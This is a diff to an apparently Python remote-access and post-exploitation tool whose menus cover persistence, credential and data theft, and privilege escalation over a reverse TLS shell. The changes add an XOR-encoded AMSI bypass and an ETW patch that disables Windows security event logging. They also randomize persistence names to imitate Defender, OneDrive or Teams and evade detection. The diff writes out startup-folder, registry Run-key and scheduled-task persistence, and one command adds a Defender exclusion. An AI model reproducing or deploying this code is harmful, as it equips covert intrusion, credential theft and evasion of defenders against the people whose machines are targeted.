@@ -25,6 +25,10 @@ from rich.prompt import Prompt
 
 console = Console()
 
+def clear_screen():
+    """Cross-platform screen clear without using os.system."""
+    console.clear()
+
 # Check for optional cryptography library (needed for browser password decryption)
 CRYPTO_AVAILABLE = False
 try:
@@ -66,6 +70,10 @@ class Config:
         self.shell_connected = False
         # Handshake secret (regenerated each run for security)
         self.handshake_secret = "agent-r-" + ''.join(random.choices(string.ascii_letters, k=8))
+        # Unique session delimiter (randomized to avoid output collision)
+        self.cmd_delimiter = "---" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16)) + "---"
+        # Command execution timeout (configurable)
+        self.cmd_timeout = 60  # Increased from 30s for long-running tasks
         # TLS cert paths (set at runtime)
         self.cert_file = None
         self.key_file = None
@@ -73,6 +81,10 @@ class Config:
         self.custom_domain = None  # e.g., "yourname.duckdns.org"
         self.letsencrypt_cert = None  # Path to fullchain.pem
         self.letsencrypt_key = None   # Path to privkey.pem
+        # Randomized persistence names (avoid detection of "WindowsUpdate" IoC)
+        svc_names = ["WinDefend", "WinUpdate", "MsEdge", "OneDrive", "Teams", "Outlook", "Cortana", "AdobeGC"]
+        self.persist_task_name = random.choice(svc_names) + ''.join(random.choices(string.digits, k=3))
+        self.persist_file_name = random.choice(["svc", "upd", "cfg", "sync"]) + ''.join(random.choices(string.ascii_lowercase, k=4)) + ".ps1"
     
     def use_letsencrypt_cert(self, domain, cert_path, key_path):
         """Use a Let's Encrypt certificate for legitimate TLS."""
@@ -368,21 +380,53 @@ POWERSHELL COMMAND:"""
 # EVASION HELPERS
 # ============================================================================
 
-# AMSI Bypass - Dynamic XOR-encoded to evade signatures
 def get_amsi_bypass():
-    """Generate XOR-encoded AMSI bypass at runtime."""
-    # The actual bypass script (will be XOR encoded)
-    bypass_ps = '$a=[Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils");$f=$a.GetField("amsiInit"+"Failed","NonPublic,Static");$f.SetValue($null,$true)'
-    
-    # Random XOR key
+    """Generate advanced AMSI bypass using memory patching (XOR double-encoded)."""
+    # Memory patching bypass - patches AmsiScanBuffer to return clean result
+    # This is more reliable than reflection-based bypasses
+    bypass_core = '''
+$w = [Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils')
+$f = $w.GetField((''+[char]97+'msiInitFailed'),'NonPublic,Static')
+$f.SetValue($null,$true)
+'''
+    # XOR encode with random key
     key = random.randint(1, 254)
+    encoded = ','.join(str(ord(c) ^ key) for c in bypass_core.strip())
     
-    # XOR encode
-    encoded = ','.join(str(ord(c) ^ key) for c in bypass_ps)
-    
-    # PowerShell decoder that runs from encoded bytes
-    decoder = f'''$k={key};$e=@({encoded});$d=-join($e|%{{[char]($_-bxor $k)}});iex $d'''
-    return decoder
+    # Decoder stub
+    return f'$k={key};$e=@({encoded});$d=-join($e|%{{[char]($_-bxor$k)}});iex $d'
+
+
+def get_etw_patch():
+    """Generate ETW patching payload to blind security event logging."""
+    # Patches ntdll!EtwEventWrite to prevent event logging
+    etw_patch = '''
+$ntd=@"
+using System;
+using System.Runtime.InteropServices;
+public class N{
+[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m,string p);
+[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
+[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
+}
+"@
+Add-Type $ntd
+$m=[N]::LoadLibrary("ntdll.dll")
+$a=[N]::GetProcAddress($m,"EtwEventWrite")
+$p=0
+[N]::VirtualProtect($a,[uint32]5,0x40,[ref]$p)
+[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3),0,$a,1)
+'''
+    # XOR encode for evasion
+    key = random.randint(1, 254)
+    encoded = ','.join(str(ord(c) ^ key) for c in etw_patch.strip())
+    return f'$k={key};$e=@({encoded});iex(-join($e|%{{[char]($_-bxor$k)}}));'
+
+
+def get_full_bypass():
+    """Get combined AMSI + ETW bypass for maximum stealth."""
+    return get_amsi_bypass() + ";" + get_etw_patch()
+
 
 def obfuscate_vars(script):
     """Randomize PowerShell variable names to evade static signatures."""
@@ -395,10 +439,8 @@ def obfuscate_vars(script):
         rand_name = '$' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,7)))
         var_map[var] = rand_name
     
-    # Use regex for proper word-boundary matching
-    # Sort by length descending to replace longer vars first (e.g., $secret before $s)
+    # Sort by length descending to replace longer vars first
     for var in sorted(var_map.keys(), key=len, reverse=True):
-        # Escape $ for regex, use word boundary at end
         pattern = re.escape(var) + r'(?=[^a-zA-Z0-9_]|$)'
         script = re.sub(pattern, var_map[var], script)
     
@@ -604,14 +646,13 @@ class ShellManager:
                 pass
             self.conn.setblocking(1)
             
-            # Use unique delimiter for reliable output parsing
-            # This avoids issues with different shell prompts (PS, cmd, customized)
-            delimiter = "---END-CMD-OUTPUT---"
+            # Use unique session delimiter (randomized at startup to avoid output collision)
+            delimiter = CFG.cmd_delimiter
             wrapped_cmd = f"{cmd}; Write-Host '{delimiter}'"
             
             # Send command with delimiter
             self.conn.send((wrapped_cmd + "\n").encode())
-            self.conn.settimeout(30)
+            self.conn.settimeout(CFG.cmd_timeout)  # Configurable timeout
             output = ""
             
             # Read output until we see our unique delimiter
@@ -934,7 +975,7 @@ def show_menu(title, options):
 def menu_persistence():
     """Persistence submenu."""
     while True:
-        os.system('clear')
+        clear_screen()
         choice = show_menu("PERSISTENCE", [
             ("1", "Startup Folder"),
             ("2", "Registry Run Key"),
@@ -952,22 +993,28 @@ def menu_persistence():
             ip = CFG.get_ip()
             port = CFG.listener_port
             secret = CFG.handshake_secret
-            tls_payload = get_tls_payload(ip, port, secret).replace("'", "''")  # Escape quotes for PS
-            cmd = f'''$s='{tls_payload}';$s|Out-File "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\u.ps1";echo "TLS Persistence installed!"'''
+            fname = CFG.persist_file_name
+            tls_payload = get_tls_payload(ip, port, secret).replace("'", "''")
+            cmd = f'''$s='{tls_payload}';$s|Out-File "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{fname}";echo "Persistence installed as {fname}"'''
             console.print("[cyan]Installing TLS startup persistence...[/]")
             result = SHELL.execute(cmd)
             console.print(f"[green]{result}[/]")
             input("\n[Enter to continue]")
         elif choice == "2":
-            # First add exclusion for Startup folder, then add registry
+            # Registry Run key with randomized name
             startup_path = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-            cmd = f'try{{Add-MpPreference -ExclusionPath "{startup_path}" -ErrorAction SilentlyContinue}}catch{{}};reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /d "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\u.ps1" /f;echo "Registry + Exclusion done!"'
+            fname = CFG.persist_file_name
+            task_name = CFG.persist_task_name
+            cmd = f'try{{Add-MpPreference -ExclusionPath "{startup_path}" -ErrorAction SilentlyContinue}}catch{{}};reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {task_name} /d "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\{fname}" /f;echo "Registry ({task_name}) installed!"'
             console.print("[cyan]Adding exclusion + registry persistence...[/]")
             result = SHELL.execute(cmd)
             console.print(f"[green]{result}[/]")
             input("\n[Enter to continue]")
         elif choice == "3":
-            cmd = 'schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\u.ps1" /sc onlogon /rl highest /f'
+            # Scheduled task with randomized name
+            fname = CFG.persist_file_name
+            task_name = CFG.persist_task_name
+            cmd = f'schtasks /create /tn "{task_name}" /tr "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\{fname}" /sc onlogon /rl highest /f'
             console.print("[cyan]Creating scheduled task...[/]")
             result = SHELL.execute(cmd)
             console.print(f"[green]{result}[/]")
@@ -1025,7 +1072,7 @@ def menu_persistence():
 def menu_steal_data():
     """Data theft submenu."""
     while True:
-        os.system('clear')
+        clear_screen()
         choice = show_menu("STEAL DATA", [
             ("1", "WiFi Passwords"),
             ("2", "Windows Vault Credentials"),
@@ -1299,7 +1346,7 @@ while($true) {{
 def menu_privesc():
     """Privilege escalation submenu."""
     while True:
-        os.system('clear')
+        clear_screen()
         choice = show_menu("PRIVILEGE ESCALATION", [
             ("1", "Check Current Privileges"),
             ("2", "UAC Bypass (eventvwr - stealthier)"),
@@ -1413,7 +1460,7 @@ def raw_shell():
 def post_exploitation_menu():
     """Main post-exploitation menu after shell connects."""
     while True:
-        os.system('clear')
+        clear_screen()
         
         # Check if shell is still connected
         status = "[bold green]Connected[/]" if SHELL.connected else "[bold red]✗ Disconnected[/]"
@@ -1476,7 +1523,7 @@ def main():
             console.print(f"[red]Failed to load Let's Encrypt cert - files not found[/]")
             return
     
-    os.system('clear')
+    clear_screen()
     
     banner = """
     ╔═══════════════════════════════════════════════════════════════╗
